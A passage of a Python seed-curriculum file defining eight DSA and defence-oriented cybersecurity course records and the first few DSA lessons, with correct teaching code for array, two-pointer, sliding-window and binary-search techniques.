"""DSA (Data Structures & Algorithms) and Cyber Security seed curriculum for AI Learning Lab.
Provides 8 comprehensive courses across 32 modules, 40 interactive visual lessons, 40 quizzes, and 8 skill progression nodes.
"""

DSA_CYBER_COURSES = [
    # -------------------------------------------------------------
    # 1. DSA Course 1: Arrays, Strings & Two Pointers
    # -------------------------------------------------------------
    {
        'slug': 'dsa-foundations-arrays-strings',
        'title': 'DSA: Arrays, Strings & Pointer Mechanics',
        'domain': 'dsa',
        'description': 'Master Big-O asymptotic analysis, static vs dynamic array memory, inward two pointers convergence, sliding window optimal substructures, and prefix sum range queries.',
        'category': 'Arrays & Strings',
        'level': 'Beginner',
        'estimated_hours': 14,
        'icon': 'Binary',
        'color': '#F43F5E',
        'order': 25,
        'is_published': True,
        'prerequisites': [],
        'skills_taught': [
            'Big-O Asymptotic Complexity',
            'Two Pointers Technique',
            'Sliding Window Optimization',
            'Prefix Sum Range Queries',
            'Binary Search Invariants',
            'Bitwise XOR Manipulation'
        ],
        'syllabus_overview': 'Arrays and contiguous memory buffers form the bedrock of performance engineering. Learn how to eliminate quadratic O(N^2) brute-force loops into blazing-fast linear O(N) pointer traversals and logarithmic O(log N) binary searches.',
        'modules': [
            {
                'id': 'dsa-arr-mod-1',
                'title': 'Module 1: Memory Layout & Big-O Time-Space Complexity',
                'description': 'Cache spatial locality, time and space complexity growth rates, and dynamic array resizing amortized analysis.',
                'order': 1,
                'lesson_ids': ['dsa-big-o-memory-arrays']
            },
            {
                'id': 'dsa-arr-mod-2',
                'title': 'Module 2: Two Pointers & In-Place Array Reversals',
                'description': 'Opposite direction convergence, identical direction fast-slow pointers, and palindrome verification in O(1) extra space.',
                'order': 2,
                'lesson_ids': ['dsa-two-pointers-technique']
            },
            {
                'id': 'dsa-arr-mod-3',
                'title': 'Module 3: Sliding Window & Subarray Prefix Sums',
                'description': 'Fixed vs variable size sliding windows, hash map frequency counters, and O(1) prefix sum range query math.',
                'order': 3,
                'lesson_ids': ['dsa-sliding-window-prefix-sums']
            },
            {
                'id': 'dsa-arr-mod-4',
                'title': 'Module 4: Binary Search Variants & Bit Manipulation',
                'description': 'Rotated sorted arrays, lower/upper insertion bounds, bit masks, and Brian Kernighan XOR algorithms.',
                'order': 4,
                'lesson_ids': ['dsa-binary-search-variants', 'dsa-bitwise-algorithms-xor']
            }
        ]
    },

    # -------------------------------------------------------------
    # 2. DSA Course 2: Linked Lists, Stacks & Queues
    # -------------------------------------------------------------
    {
        'slug': 'dsa-linked-lists-stacks-queues',
        'title': 'DSA: Linked Lists, Stacks & Monotonic Queues',
        'domain': 'dsa',
        'description': 'Master pointer manipulations in singly and doubly linked lists, fast-slow Floyd cycle detection, LIFO call stacks, monotonic stack optimizations, and LRU Cache design.',
        'category': 'Linked Lists & Stacks',
        'level': 'Intermediate',
        'estimated_hours': 16,
        'icon': 'Layers',
        'color': '#FB7185',
        'order': 26,
        'is_published': True,
        'prerequisites': ['dsa-foundations-arrays-strings'],
        'skills_taught': [
            'Singly & Doubly Linked Lists',
            'Floyd Tortoise and Hare Cycle Detection',
            'LIFO Stack Frame Mechanics',
            'Monotonic Decreasing Stacks',
            'Sliding Window Maximum Deque',
            'LRU Cache Hash Map + Doubly Linked List'
        ],
        'syllabus_overview': 'Move beyond contiguous memory into pointer-linked node references. Understand how stacks govern function calls, how monotonic queues solve range maximum queries in O(N), and how to architect an O(1) LRU Cache.',
        'modules': [
            {
                'id': 'dsa-list-mod-1',
                'title': 'Module 1: Pointer Manipulation & List Reversals',
                'description': 'Sentinel dummy heads, in-place 3-pointer list reversal, and merging sorted linked lists.',
                'order': 1,
                'lesson_ids': ['dsa-linked-list-reversal-dummy']
            },
            {
                'id': 'dsa-list-mod-2',
                'title': 'Module 2: Fast & Slow Pointers (Floyd Cycle Detection)',
                'description': 'Mathematical proof of 2x speed runner meeting in cyclic loops and finding the cycle entry origin.',
                'order': 2,
                'lesson_ids': ['dsa-floyd-cycle-detection']
            },
            {
                'id': 'dsa-list-mod-3',
                'title': 'Module 3: Monotonic Stacks & Next Greater Element',
                'description': 'Maintaining ordered stack invariants to solve Daily Temperatures, Stock Spans, and Largest Rectangle in Histogram.',
                'order': 3,
                'lesson_ids': ['dsa-monotonic-stacks-queues']
            },
            {
                'id': 'dsa-list-mod-4',
                'title': 'Module 4: Deques & High-Performance LRU Cache',
                'description': 'Monotonic double-ended queues for sliding window maximum and combining Hash Maps with Doubly Linked Lists for O(1) LRU Caching.',
                'order': 4,
                'lesson_ids': ['dsa-sliding-window-maximum-deque', 'dsa-lru-cache-doubly-linked-list']
            }
        ]
    },

    # -------------------------------------------------------------
    # 3. DSA Course 3: Trees, Graphs & Shortest Path
    # -------------------------------------------------------------
    {
        'slug': 'dsa-trees-graphs-search',
        'title': 'DSA: Trees, Binary Search & Graph Algorithms',
        'domain': 'dsa',
        'description': 'Master Binary Search Trees, recursive tree traversals (Inorder, Preorder, Postorder), Breadth-First Search (BFS), Depth-First Search (DFS), Tries, and Disjoint Set Union (Union-Find).',
        'category': 'Trees & Graphs',
        'level': 'Intermediate',
        'estimated_hours': 18,
        'icon': 'GitBranch',
        'color': '#E11D48',
        'order': 27,
        'is_published': True,
        'prerequisites': ['dsa-linked-lists-stacks-queues'],
        'skills_taught': [
            'Binary Search Tree Properties',
            'Recursive Tree Traversals',
            'Graph Adjacency Lists',
            'BFS Shortest Path',
            'DFS Cycle Detection & Topological Sort',
            'Trie (Prefix Tree) Autocomplete',
            'Union-Find (Disjoint Set) with Path Compression'
        ],
        'syllabus_overview': 'Hierarchical tree topologies and arbitrary network graphs power databases, compilers, route planners, and social networks. Master recursive traversal dynamics, prefix Tries, and Disjoint Set Union.',
        'modules': [
            {
                'id': 'dsa-tree-mod-1',
                'title': 'Module 1: Binary Search Tree (BST) & Validations',
                'description': 'BST lookup invariants, recursive validation with min-max bounds, and lowest common ancestor (LCA).',
                'order': 1,
                'lesson_ids': ['dsa-bst-validation-operations']
            },
            {
                'id': 'dsa-tree-mod-2',
                'title': 'Module 2: Graph BFS & Level-Order Shortest Path',
                'description': 'Unweighted shortest path discovery, queue-based frontier expansion, and connected components.',
                'order': 2,
                'lesson_ids': ['dsa-graph-bfs-traversals']
            },
            {
                'id': 'dsa-tree-mod-3',
                'title': 'Module 3: DFS Backtracking & Topological Sort',
                'description': 'Directed acyclic graph (DAG) dependency resolution, Kahn algorithm, and backtracking recursion trees.',
                'order': 3,
                'lesson_ids': ['dsa-dfs-topological-sort']
            },
            {
                'id': 'dsa-tree-mod-4',
                'title': 'Module 4: Tries (Prefix Trees) & Disjoint Set Union',
                'description': 'Autocomplete prefix matching in O(L) time and near O(1) connectivity clustering with Union-Find.',
                'order': 4,
                'lesson_ids': ['dsa-trie-autocomplete-prefix', 'dsa-union-find-disjoint-set']
            }
        ]
    },

    # -------------------------------------------------------------
    # 4. DSA Course 4: Recursion & Dynamic Programming
    # -------------------------------------------------------------
    {
        'slug': 'dsa-dynamic-programming-recursion',
        'title': 'DSA: Dynamic Programming & Optimal Substructures',
        'domain': 'dsa',
        'description': 'Deconstruct complex optimization problems into memoized subproblems: Top-down memoization, bottom-up 1D/2D tabulation, 0/1 Knapsack, 2D Grid Paths, and Longest Increasing Subsequence.',
        'category': 'Dynamic Programming',
        'level': 'Advanced',
        'estimated_hours': 20,
        'icon': 'Box',
        'color': '#BE123C',
        'order': 28,
        'is_published': True,
        'prerequisites': ['dsa-trees-graphs-search'],
        'skills_taught': [
            'Optimal Substructure Identification',
            'Overlapping Subproblems',
            'Top-Down Recursion with Memoization',
            'Bottom-Up Tabulation',
            '0/1 Knapsack Pattern',
            '2D Grid DP & Obstacle Navigation',
            'Longest Increasing Subsequence (LIS) & Patience Sort'
        ],
        'syllabus_overview': 'Transform exponential O(2^N) brute force algorithms into polynomial O(N) or O(N*W) time solutions by storing and reusing intermediate subproblem states in DP matrices and patience sorting trees.',
        'modules': [
            {
                'id': 'dsa-dp-mod-1',
                'title': 'Module 1: Recursion Trees & Memoization Caches',
                'description': 'Visualizing call stacks, overlapping subproblems, and dictionary memoization.',
                'order': 1,
                'lesson_ids': ['dsa-memoization-vs-tabulation']
            },
            {
                'id': 'dsa-dp-mod-2',
                'title': 'Module 2: 1D Dynamic Programming (Climbing Stairs & Robber)',
                'description': 'State transitions, base cases, and rolling variable space optimization from O(N) to O(1).',
                'order': 2,
                'lesson_ids': ['dsa-1d-dp-state-transitions']
            },
            {
                'id': 'dsa-dp-mod-3',
                'title': 'Module 3: 2D Dynamic Programming (0/1 Knapsack & Grid Paths)',
                'description': '2D DP tables, item weight/value constraints, and state transition equations.',
                'order': 3,
                'lesson_ids': ['dsa-2d-knapsack-matrix']
            },
            {
                'id': 'dsa-dp-mod-4',
                'title': 'Module 4: Grid DP & Longest Increasing Subsequence',
                'description': 'Unique path grids, obstacle matrix transitions, and O(N log N) patience sorting for LIS.',
                'order': 4,
                'lesson_ids': ['dsa-unique-paths-2d-grid', 'dsa-longest-increasing-subsequence']
            }
        ]
    },

    # -------------------------------------------------------------
    # 5. Cyber Course 1: Foundations & Network Security
    # -------------------------------------------------------------
    {
        'slug': 'cybersecurity-foundations-network-security',
        'title': 'Cybersecurity Fundamentals & Network Defense',
        'domain': 'cybersecurity',
        'description': 'Master the CIA Triad (Confidentiality, Integrity, Availability), OSI layer security threats, TCP 3-way handshakes, port scanning mechanisms, stateful firewalls, and DNSSEC/ARP defenses.',
        'category': 'Network Security',
        'level': 'Beginner',
        'estimated_hours': 14,
        'icon': 'ShieldCheck',
        'color': '#14B8A6',
        'order': 29,
        'is_published': True,
        'prerequisites': [],
        'skills_taught': [
            'CIA Security Triad',
            'TCP/IP 3-Way Handshake Security',
            'SYN Flood & DoS Defense',
            'Nmap Port Scanning Analysis',
            'Stateful Ingress Firewalls (iptables/nftables)',
            'DNS Cache Poisoning & DNSSEC',
            'ARP Spoofing & Layer 2 MITM Defense'
        ],
        'syllabus_overview': 'Understand the fundamental defense-in-depth security model. Explore how adversaries discover open network services, hijack DNS/ARP layers, and how stateful firewalls drop unauthorized packet probes.',
        'modules': [
            {
                'id': 'cyber-net-mod-1',
                'title': 'Module 1: The CIA Triad & Threat Modeling Frameworks',
                'description': 'Confidentiality, integrity, availability, STRIDE threat modeling, and defense-in-depth layers.',
                'order': 1,
                'lesson_ids': ['cyber-cia-triad-threat-modeling']
            },
            {
                'id': 'cyber-net-mod-2',
                'title': 'Module 2: TCP/IP Handshake Probing & Port Scanning',
                'description': 'SYN/ACK packet mechanics, half-open stealth scans, and banner grabbing.',
                'order': 2,
                'lesson_ids': ['cyber-tcp-handshake-port-scanning']
            },
            {
                'id': 'cyber-net-mod-3',
                'title': 'Module 3: Stateful Firewalls & Ingress Traffic Rules',
                'description': 'Packet filtering rules, connection state tracking (ESTABLISHED, RELATED), and dropping malicious probes.',
                'order': 3,
                'lesson_ids': ['cyber-stateful-firewall-defense']
            },
            {
                'id': 'cyber-net-mod-4',
                'title': 'Module 4: DNS Security, ARP Poisoning & Packet Sniffing',
                'description': 'Kaminsky DNS cache poisoning, cryptographic DNSSEC verification, and ARP MITM defense with DAI.',
                'order': 4,
                'lesson_ids': ['cyber-dns-poisoning-dnssec', 'cyber-arp-spoofing-mitm-defense']
            }
        ]
    },

    # -------------------------------------------------------------
    # 6. Cyber Course 2: Applied Cryptography & PKI
    # -------------------------------------------------------------
    {
        'slug': 'cybersecurity-cryptography-pki',
        'title': 'Applied Cryptography, Hashing & Public Key PKI',
        'domain': 'cybersecurity',
        'description': 'Master Symmetric (AES-GCM) vs Asymmetric (RSA/ECC) encryption, cryptographic hash functions (SHA-256), SSL/TLS 1.3 certificates, Elliptic Curve Diffie-Hellman, and Post-Quantum Cryptography.',
        'category': 'Applied Cryptography',
        'level': 'Intermediate',
        'estimated_hours': 16,
        'icon': 'Lock',
        'color': '#0D9488',
        'order': 30,
        'is_published': True,
        'prerequisites': ['cybersecurity-foundations-network-security'],
        'skills_taught': [
            'Symmetric AES-256 Encryption',
            'Asymmetric RSA & Elliptic Curves (ECC)',
            'SHA-256 One-Way Hash Avalanche',
            'Digital Signatures & Non-Repudiation',
            'X.509 PKI Certificates & TLS Handshakes',
            'ECDH Key Agreement & ECDSA Signatures',
            'Post-Quantum Cryptography (Lattice-Based Kyber)'
        ],
        'syllabus_overview': 'Cryptography is the mathematical armor of modern computer systems. Learn how asymmetric key pairs establish secure channels, how cryptographic hashes verify data integrity, and how post-quantum algorithms resist quantum attacks.',
        'modules': [
            {
                'id': 'cyber-crypto-mod-1',
                'title': 'Module 1: Symmetric vs Asymmetric Key Cryptography',
                'description': 'Block ciphers, initialization vectors (IV), AES-GCM authenticated encryption, and RSA key mathematics.',
                'order': 1,
                'lesson_ids': ['cyber-symmetric-asymmetric-encryption']
            },
            {
                'id': 'cyber-crypto-mod-2',
                'title': 'Module 2: SHA-256 Hashing, HMAC & Avalanche Diffusion',
                'description': 'Collision resistance, pre-image resistance, 1-bit input avalanche effect, and HMAC message authentication.',
                'order': 2,
                'lesson_ids': ['cyber-sha256-hashing-avalanche']
            },
            {
                'id': 'cyber-crypto-mod-3',
                'title': 'Module 3: PKI, Digital Signatures & TLS 1.3 Handshakes',
                'description': 'Certificate Authorities (CA), X.509 chains, Diffie-Hellman key exchange, and TLS encryption in transit.',
                'order': 3,
                'lesson_ids': ['cyber-pki-tls-handshake']
            },
            {
                'id': 'cyber-crypto-mod-4',
                'title': 'Module 4: Elliptic Curves (ECC) & Post-Quantum Cryptography',
                'description': 'Weierstrass curve point addition, 256-bit ECC efficiency, Shor algorithm impact, and lattice-based PQC.',
                'order': 4,
                'lesson_ids': ['cyber-ecc-elliptic-curve-diffie-hellman', 'cyber-post-quantum-cryptography']
            }
        ]
    },

    # -------------------------------------------------------------
    # 7. Cyber Course 3: Web Application Security & OWASP Top 10
    # -------------------------------------------------------------
    {
        'slug': 'cybersecurity-web-app-security-owasp',
        'title': 'Web Application Security & OWASP Top 10',
        'domain': 'cybersecurity',
        'description': 'Defend modern web APIs and frontends against the OWASP Top 10: SQLi, XSS, CSRF, SSRF, Broken Object Level Authorization (BOLA), and JWT session tampering.',
        'category': 'Web App Security & OWASP',
        'level': 'Intermediate',
        'estimated_hours': 18,
        'icon': 'ShieldAlert',
        'color': '#0F766E',
        'order': 31,
        'is_published': True,
        'prerequisites': ['cybersecurity-cryptography-pki'],
        'skills_taught': [
            'SQL Injection Parameterized Defense',
            'Cross-Site Scripting (XSS) Sanitization',
            'Content Security Policy (CSP) Headers',
            'JSON Web Token (JWT) Signature Validation',
            'Anti-CSRF Tokens & SameSite Cookie Policies',
            'Server-Side Request Forgery (SSRF) Cloud Defense'
        ],
        'syllabus_overview': 'Web applications handle sensitive user transactions and credentials. Understand the anatomy of injection vulnerabilities and implement defense-grade sanitizers, CSRF protections, and cloud metadata egress guards.',
        'modules': [
            {
                'id': 'cyber-web-mod-1',
                'title': 'Module 1: SQL Injection (SQLi) & Parameterized Queries',
                'description': 'Syntax injection, tautology bypasses, SQL AST parsing, and prepared statements.',
                'order': 1,
                'lesson_ids': ['cyber-sqli-parameterized-defense']
            },
            {
                'id': 'cyber-web-mod-2',
                'title': 'Module 2: Cross-Site Scripting (XSS) & Content Security Policy',
                'description': 'Stored vs Reflected XSS, DOM-based execution, HTML entity encoding, and CSP headers.',
                'order': 2,
                'lesson_ids': ['cyber-xss-sanitization-csp']
            },
            {
                'id': 'cyber-web-mod-3',
                'title': 'Module 3: JWT Security, HMAC Tampering & Secure Sessions',
                'description': 'Token header/payload breakdown, None-algorithm exploits, signature verification, and HTTP-only cookies.',
                'order': 3,
                'lesson_ids': ['cyber-jwt-security-session-hardening']
            },
            {
                'id': 'cyber-web-mod-4',
                'title': 'Module 4: SSRF, CSRF & Broken Object Authorization',
                'description': 'Anti-CSRF synchronizer tokens, SameSite policies, SSRF AWS metadata 169.254.169.254 defense, and BOLA gates.',
                'order': 4,
                'lesson_ids': ['cyber-csrf-same-site-tokens', 'cyber-ssrf-internal-metadata-defense']
            }
        ]
    },

    # -------------------------------------------------------------
    # 8. Cyber Course 4: Threat Hunting & Zero Trust Defense
    # -------------------------------------------------------------
    {
        'slug': 'cybersecurity-system-defense-threat-hunting',
        'title': 'Threat Hunting, Endpoint Defense & Zero Trust',
        'domain': 'cybersecurity',
        'description': 'Master enterprise security architecture: Zero Trust Principles, password salting vs rainbow tables, NIST Incident Response, MITRE ATT&CK matrix threat hunting, and live memory forensics.',
        'category': 'Threat Hunting & Zero Trust',
        'level': 'Advanced',
        'estimated_hours': 20,
        'icon': 'Cpu',
        'color': '#115E59',
        'order': 32,
        'is_published': True,
        'prerequisites': ['cybersecurity-web-app-security-owasp'],
        'skills_taught': [
            'Zero Trust Architecture Principles',
            'Password Salting & Argon2id/Bcrypt',
            'Privilege Escalation & Least Privilege',
            'Incident Response (NIST SP 800-61)',
            'MITRE ATT&CK Matrix & Sigma SIEM Rules',
            'Volatile RAM Memory Forensics (Volatility Framework)'
        ],
        'syllabus_overview': 'Modern enterprise defense assumes breach. Learn how Zero Trust architectures enforce micro-segmentation, continuous authentication, Sigma detection rules, and memory dump forensic investigations.',
        'modules': [
            {
                'id': 'cyber-def-mod-1',
                'title': 'Module 1: Zero Trust Architecture & Micro-Segmentation',
                'description': 'Never Trust Always Verify, Identity-aware proxies, least privilege access, and blast radius reduction.',
                'order': 1,
                'lesson_ids': ['cyber-zero-trust-microsegmentation']
            },
            {
                'id': 'cyber-def-mod-2',
                'title': 'Module 2: Password Entropy, Salting & Bcrypt/Argon2',
                'description': 'Entropy bit calculation, rainbow table neutralization, cryptographic salts, and memory-hard key derivation.',
                'order': 2,
                'lesson_ids': ['cyber-password-salting-argon2']
            },
            {
                'id': 'cyber-def-mod-3',
                'title': 'Module 3: Incident Response & Threat Containment',
                'description': 'NIST Incident Response phases (Preparation, Detection, Containment, Eradication, Post-Incident Learning).',
                'order': 3,
                'lesson_ids': ['cyber-incident-response-containment']
            },
            {
                'id': 'cyber-def-mod-4',
                'title': 'Module 4: MITRE ATT&CK Matrix & Memory Forensics',
                'description': 'Adversary TTP mapping, SIEM log correlation, Sigma rules, and Volatile RAM process injection inspection.',
                'order': 4,
                'lesson_ids': ['cyber-mitre-attack-matrix-threat-hunting', 'cyber-memory-forensics-volatility']
            }
        ]
    }
]

# -----------------------------------------------------------------
# LESSONS DATA (40 Lessons)
# -----------------------------------------------------------------
DSA_CYBER_LESSONS = [
    # === DSA Course 1 Lessons ===
    {
        'slug': 'dsa-big-o-memory-arrays',
        'course_slug': 'dsa-foundations-arrays-strings',
        'module_id': 'dsa-arr-mod-1',
        'title': 'Contiguous Memory Layout & Big-O Asymptotic Complexity',
        'order': 1,
        'estimated_minutes': 15,
        'difficulty': 'Beginner',
        'skill_tag': 'dsa_arrays',
        'learning_objectives': [
            'Understand how arrays utilize continuous RAM memory addresses with O(1) random index access.',
            'Master Big-O time and space complexity growth rates: O(1), O(log N), O(N), O(N log N), O(N^2).',
            'Analyze dynamic array doubling mechanics and amortized O(1) append costs.'
        ],
        'theory_sections': [
            {
                'title': 'Array Memory Addressing & CPU Cache Locality',
                'content_markdown': 'An array is a **contiguous sequence of memory bytes** where each element occupies the same size block in RAM.\n\nBecause the memory addresses are sequential, computing the physical memory address of any index `i` is an instant mathematical calculation:\n\n$$\\text{Address}(A[i]) = \\text{BaseAddress} + (i \\times \\text{ElementSize})$$\n\nThis gives arrays their characteristic **O(1) Constant Time** lookup capability. Furthermore, modern CPU L1/L2 caches pre-fetch sequential array memory blocks, making array iterations up to 50x faster than linked pointer structures.',
                'key_takeaway': 'Arrays provide O(1) instantaneous indexing because memory addresses are calculated arithmetically without traversing nodes.'
            },
            {
                'title': 'Big-O Asymptotic Complexity Classification',
                'content_markdown': 'Big-O notation characterizes how an algorithm\'s runtime or memory consumption scales as input size $N$ approaches infinity:\n\n* **$O(1)$ Constant Time:** Direct array access, stack push/pop, hash map lookup.\n* **$O(\\log N)$ Logarithmic Time:** Binary search splitting the problem in half each step.\n* **$O(N)$ Linear Time:** Single pass iterating over $N$ items.\n* **$O(N \\log N)$ Linearithmic Time:** Optimal comparison-based sorting (Merge Sort, Quick Sort).\n* **$O(N^2)$ Quadratic Time:** Nested loops over the input.',
                'key_takeaway': 'Always strive to optimize quadratic O(N^2) brute-force solutions down to linear O(N) or linearithmic O(N log N).'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Contiguous RAM Array Indexing',
            'subtitle': 'Sequential memory offsets enabling O(1) random element access',
            'diagram_type': 'two_pointers_array',
            'parameters': {'array': [10, 20, 30, 40, 50]}
        },
        'code_example': {
            'title': 'Demonstrating Constant Time Array Access vs Linear Search',
            'language': 'python',
            'code': 'from typing import List, Optional\n\ndef get_element_at_index(arr: List[int], index: int) -> int:\n    """O(1) Instant Arithmetic Access."""\n    return arr[index]\n\ndef linear_search(arr: List[int], target: int) -> Optional[int]:\n    """O(N) Traversal requiring sequential inspection."""\n    for i, val in enumerate(arr):\n        if val == target:\n            return i\n    return None\n\ndata = [5, 12, 27, 39, 44, 88]\nprint(f"O(1) Direct Lookup at index 3: {get_element_at_index(data, 3)}")\nprint(f"O(N) Search for 44 index:      {linear_search(data, 44)}")',
            'explanation': 'Direct index access jumps instantly to RAM via base pointer offset, whereas searching requires inspecting each element sequentially.',
            'output_preview': 'O(1) Direct Lookup at index 3: 39\nO(N) Search for 44 index:      4'
        },
        'quiz_id': 'quiz-dsa-big-o-memory-arrays',
        'summary': 'You mastered contiguous array memory allocation and asymptotic Big-O runtime analysis.',
        'next_lesson_slug': 'dsa-two-pointers-technique',
        'prev_lesson_slug': None
    },
    {
        'slug': 'dsa-two-pointers-technique',
        'course_slug': 'dsa-foundations-arrays-strings',
        'module_id': 'dsa-arr-mod-2',
        'title': 'Two Pointers Technique & In-Place Convergences',
        'order': 2,
        'estimated_minutes': 15,
        'difficulty': 'Beginner',
        'skill_tag': 'dsa_arrays',
        'learning_objectives': [
            'Master the inward two-pointer technique on sorted arrays to achieve O(N) runtime and O(1) auxiliary space.',
            'Solve the Two Sum II and Container With Most Water problem patterns.',
            'Perform in-place array reversals and palindrome checks without allocating extra memory.'
        ],
        'theory_sections': [
            {
                'title': 'Inward Pointer Convergence Principle',
                'content_markdown': 'When an array is sorted, searching for a pair that sums to a target value using two nested loops takes $O(N^2)$ time.\n\nWith **Two Pointers**, we place `left = 0` and `right = N - 1`. In each step, we calculate `current_sum = arr[left] + arr[right]`:\n\n1. If `current_sum == target`: Pair found!\n2. If `current_sum < target`: Because the array is sorted, the only way to increase the sum is to increment `left += 1`.\n3. If `current_sum > target`: The only way to decrease the sum is to decrement `right -= 1`.\n\nEvery iteration eliminates at least one candidate element, guaranteeing completion in at most $N$ operations ($O(N)$ linear time) using only $O(1)$ constant memory.',
                'key_takeaway': 'Two pointers prune search space in sorted arrays by making deterministic directional choices based on sum comparisons.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Two Pointers Search Convergence',
            'subtitle': 'Left and Right pointers moving inward to locate target sum',
            'diagram_type': 'two_pointers_array',
            'parameters': {'target': 22}
        },
        'code_example': {
            'title': 'Two Sum II (Sorted Array) in O(N) Time and O(1) Space',
            'language': 'python',
            'code': 'from typing import List, Optional, Tuple\n\ndef two_sum_sorted(numbers: List[int], target: int) -> Optional[Tuple[int, int]]:\n    left = 0\n    right = len(numbers) - 1\n    \n    while left < right:\n        curr_sum = numbers[left] + numbers[right]\n        if curr_sum == target:\n            return (left, right)\n        elif curr_sum < target:\n            left += 1\n        else:\n            right -= 1\n    return None\n\nnums = [2, 7, 11, 15, 19, 23]\ntarget_val = 26\nres = two_sum_sorted(nums, target_val)\nprint(f"Target {target_val} found at indices {res} -> {nums[res[0]]} + {nums[res[1]]} = {target_val}")',
            'explanation': 'The algorithm converges left and right pointers inward, checking the target sum in a single linear pass.',
            'output_preview': 'Target 26 found at indices (1, 4) -> 7 + 19 = 26'
        },
        'quiz_id': 'quiz-dsa-two-pointers-technique',
        'summary': 'You mastered the inward two pointers pattern for linear time array problem solving.',
        'next_lesson_slug': 'dsa-sliding-window-prefix-sums',
        'prev_lesson_slug': 'dsa-big-o-memory-arrays'
    },
    {
        'slug': 'dsa-sliding-window-prefix-sums',
        'course_slug': 'dsa-foundations-arrays-strings',
        'module_id': 'dsa-arr-mod-3',
        'title': 'Sliding Window Optimization & Prefix Sums',
        'order': 3,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_arrays',
        'learning_objectives': [
            'Implement dynamic and fixed-size sliding window algorithms for contiguous subarray problems.',
            'Build prefix sum arrays to answer arbitrary range sum queries in O(1) time.',
            'Solve the Longest Substring Without Repeating Characters and Maximum Subarray Sum of size K.'
        ],
        'theory_sections': [
            {
                'title': 'The Sliding Window Subarray Paradigm',
                'content_markdown': 'A **Sliding Window** maintains a valid subarray/substring state bounded by `[L, R]`. Instead of recalculating the entire window on every step (an $O(K)$ operation per step), we:\n\n1. Expand the right pointer `R += 1` to include the next incoming element.\n2. Shrink the left pointer `L += 1` when the window violates a constraint (e.g. duplicate character or sum threshold).\n\nBecause each pointer traverses the array at most once, total runtime is strictly **$O(N)$ Linear Time**.',
                'key_takeaway': 'Sliding windows reuse prior window state computations to find optimal contiguous subarrays in O(N).'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Sliding Window Subarray Tracker',
            'subtitle': 'Expanding and shrinking window boundaries in linear time',
            'diagram_type': 'two_pointers_array',
            'parameters': {'window_size': 3}
        },
        'code_example': {
            'title': 'Maximum Sum Subarray of Fixed Size K',
            'language': 'python',
            'code': 'from typing import List\n\ndef max_sub_array_sum(arr: List[int], k: int) -> int:\n    if len(arr) < k:\n        return 0\n    \n    window_sum = sum(arr[:k])\n    max_sum = window_sum\n    \n    for i in range(k, len(arr)):\n        window_sum += arr[i] - arr[i - k]\n        max_sum = max(max_sum, window_sum)\n        \n    return max_sum\n\nscores = [2, 1, 5, 1, 3, 2, 8, 4]\nk_size = 3\nprint(f"Max sum for window size {k_size}: {max_sub_array_sum(scores, k_size)}")',
            'explanation': 'By subtracting the outgoing element and adding the incoming element in O(1), the entire array is processed in O(N).',
            'output_preview': 'Max sum for window size 3: 14'
        },
        'quiz_id': 'quiz-dsa-sliding-window-prefix-sums',
        'summary': 'You mastered fixed and variable sliding windows and prefix sum calculations.',
        'next_lesson_slug': 'dsa-binary-search-variants',
        'prev_lesson_slug': 'dsa-two-pointers-technique'
    },
    {
        'slug': 'dsa-binary-search-variants',
        'course_slug': 'dsa-foundations-arrays-strings',
        'module_id': 'dsa-arr-mod-4',
        'title': 'Binary Search: Insertion Bounds & Rotated Arrays',
        'order': 4,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_arrays',
        'learning_objectives': [
            'Master classic binary search and prevent integer overflow bugs with `mid = low + (high - low) // 2`.',
            'Implement Lower Bound (bisect_left) and Upper Bound (bisect_right) insertion index finders.',
            'Search in Rotated Sorted Arrays in O(log N) time by determining which half is strictly sorted.'
        ],
        'theory_sections': [
            {
                'title': 'Binary Search Invariants & Rotated Array Mechanics',
                'content_markdown': 'Binary Search reduces the search space by half at every step ($O(\\log N)$):\n\nIn a **Rotated Sorted Array** (e.g. `[4, 5, 6, 7, 0, 1, 2]`), at least one half is always strictly sorted:\n\n1. If `nums[low] <= nums[mid]`: The left half is sorted.\n   * If `nums[low] <= target < nums[mid]`, target must be on the left $\\implies$ `high = mid - 1`.\n   * Otherwise, target is on the right $\\implies$ `low = mid + 1`.\n2. Otherwise, the right half is sorted $\\implies$ mirror the logic.',
                'key_takeaway': 'Even in rotated arrays, determining which half is sorted allows binary search to retain O(log N) efficiency.'
            }
        ],
        'visual_explainer': {
            'type': 'interactive_diagram',
            'title': 'Binary Search Interval Halving',
            'subtitle': 'Repeatedly bisecting the active search interval in O(log N) steps',
            'diagram_type': 'two_pointers_array',
            'parameters': {'target': 7}
        },
        'code_example': {
            'title': 'Search in Rotated Sorted Array in O(log N) Time',
            'language': 'python',
            'code': 'from typing import List\n\ndef search_rotated(nums: List[int], target: int) -> int:\n    low, high = 0, len(nums) - 1\n    while low <= high:\n        mid = low + (high - low) // 2\n        if nums[mid] == target:\n            return mid\n        # Check if left half is sorted\n        if nums[low] <= nums[mid]:\n            if nums[low] <= target < nums[mid]:\n                high = mid - 1\n            else:\n                low = mid + 1\n        else: # Right half is sorted\n            if nums[mid] < target <= nums[high]:\n                low = mid + 1\n            else:\n                high = mid - 1\n    return -1\n\narr = [4, 5, 6, 7, 0, 1, 2]\nprint(f"Index of target 0: {search_rotated(arr, 0)}")\nprint(f"Index of target 3: {search_rotated(arr, 3)}")',
            'explanation': 'By checking which half is monotonic, binary search finds elements in rotated arrays without full scanning.',
            'output_preview': 'Index of target 0: 4\nIndex of target 3: -1'
        },
        'quiz_id': 'quiz-dsa-binary-search-variants',
        'summary': 'You mastered binary search boundary conditions and rotated array indexing in O(log N).',
        'next_lesson_slug': 'dsa-bitwise-algorithms-xor',
        'prev_lesson_slug': 'dsa-sliding-window-prefix-sums'
    },
    {
        'slug': 'dsa-bitwise-algorithms-xor',
        'course_slug': 'dsa-foundations-arrays-strings',
        'module_id': 'dsa-arr-mod-4',
        'title': 'Bit Manipulation & XOR Properties',
        'order': 5,
        'estimated_minutes': 15,
        'difficulty': 'Intermediate',
        'skill_tag': 'dsa_arrays',
        'learning_objectives': [
            'Master bitwise operators: `&` (AND), `|` (OR), `^` (XOR), `~` (NOT), `<<`, `>>`.',
            'Utilize XOR algebraic properties ($x \\oplus x = 0$, $x \\oplus 0 = x$) to isolate unique elements in O(N) time and O(1) space.',
